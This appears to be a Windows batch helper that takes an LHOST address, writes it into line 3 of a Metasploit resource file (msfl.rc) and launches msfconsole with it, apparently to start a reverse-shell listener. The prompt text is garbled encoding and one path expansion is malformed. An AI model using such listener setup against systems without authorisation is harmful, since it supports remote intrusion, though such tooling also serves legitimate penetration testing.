@echo off
setlocal EnableDelayedExpansion
set row=3
set strtext=%*
if "%strtext%"=="%void%" (set /p strtext=ÇëÊäÈëLHOST:)
set i=0
for /f "delims=" %%a in (msfl.rc) do (
set /a i+=1
if !i! == %row% (
echo set lhost %strtext% >>temp
) else (
echo %%a >>temp
)
)
del msfl.rc
ren temp msfl.rc
call %bin%\msfconsole.bat -r %bin\%msfl.rc